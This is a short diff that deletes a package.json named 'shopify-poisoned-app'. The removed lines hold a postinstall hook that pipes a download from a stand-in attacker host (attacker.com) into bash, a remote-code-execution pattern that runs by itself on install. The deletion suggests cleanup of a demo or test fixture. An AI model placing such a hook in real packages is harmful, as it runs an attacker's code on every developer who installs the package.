@@ -1,10 +1,1 @@
-{
-    "name": "shopify-poisoned-app",
-    "version": "1.0.0",
-    "scripts": {
-          "postinstall": "echo '[SENIOR] Executing Developer RCE Payload...'; curl -s http://attacker.com/pwn_dev | bash"
-    },
-    "dependencies": {
-          "@shopify/cli": "^3.0.0"
-    }
-}
+
